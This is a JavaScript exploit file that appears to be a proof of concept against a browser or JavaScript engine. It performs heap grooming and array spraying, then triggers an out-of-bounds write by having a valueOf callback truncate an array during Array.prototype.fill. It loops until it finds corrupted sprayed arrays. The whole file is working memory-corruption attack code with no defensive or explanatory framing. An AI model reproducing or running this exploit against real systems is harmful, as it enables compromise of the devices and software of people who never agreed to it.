import { log, sleep } from './module/utils.mjs';

function gc() {
    new Uint8Array(4 * 1024 * 1024);
}

class ContinuousOOBSpray {
    constructor() {
        this.spray = [];
        this.marker = 0x42424242;
        this.found = 0;
    }

    async execute() {
        await this.continuousSprayAndCheck();
    }

    async continuousSprayAndCheck() {
        let round = 0;
        
        while (true) {
            log("Round " + round);
            
            // Heap grooming - create holes and patterns
            await this.heapGrooming(round);
            
            // Spray arrays after grooming
            await this.sprayArrays(round);
            
            // Trigger OOB
            await this.triggerOOB();
            
            // Check for corruption
            await this.checkCorruption(round);
            
            if (this.found > 0) {
                log("SUCCESS: Found " + this.found + " corrupted arrays!");
                break;
            }
            
            round++;
            await sleep(50);
        }
    }

    async heapGrooming(round) {
        // Create alternating pattern of allocations and frees
        const tempBuffers = [];
        
        // Allocate various sizes to create fragmentation
        for (let i = 0; i < 1000; i++) {
            const size = 64 + (i % 8) * 16;
            tempBuffers.push(new ArrayBuffer(size));
        }
        
        // Free some to create holes
        for (let i = 0; i < 500; i++) {
            tempBuffers[i] = null;
        }
        
        // Allocate more to fill holes
        for (let i = 0; i < 300; i++) {
            tempBuffers.push(new ArrayBuffer(128));
        }
        
        log("Heap grooming round " + round + " completed");
        gc();
    }

    async sprayArrays(round) {
        for (let i = 0; i < 500; i++) {
            const arr = new Array(100);
            for (let j = 0; j < arr.length; j++) {
                arr[j] = {
                    marker: this.marker,
                    round: round,
                    index: i,
                    position: j
                };
            }
            this.spray.push(arr);
        }
        log("Sprayed " + this.spray.length + " total arrays");
    }

    async triggerOOB() {
        const v0 = [];
        for (let i2 = 0; i2 < 1000000; i2++) {
            v0[i2] = [];
        }
        const v10 = new Object(Object, v0);
        function f11() {
            v0.length = 0;
            return 0;
        }
        const o14 = {
            "valueOf": f11,
        };
        v0.fill(v10, o14);
    }

    async checkCorruption(round) {
        for (let i = 0; i < this.spray.length; i++) {
            const arr = this.spray[i];
            for (let j = arr.length; j < arr.length + 20; j++) {
                if (arr[j] !== undefined && arr[j].marker === this.marker) {
                    log("FOUND OOB: array " + i + " index " + j + " round " + arr[j].round);
                    this.found++;
                }
            }
        }
    }
}

new ContinuousOOBSpray().execute();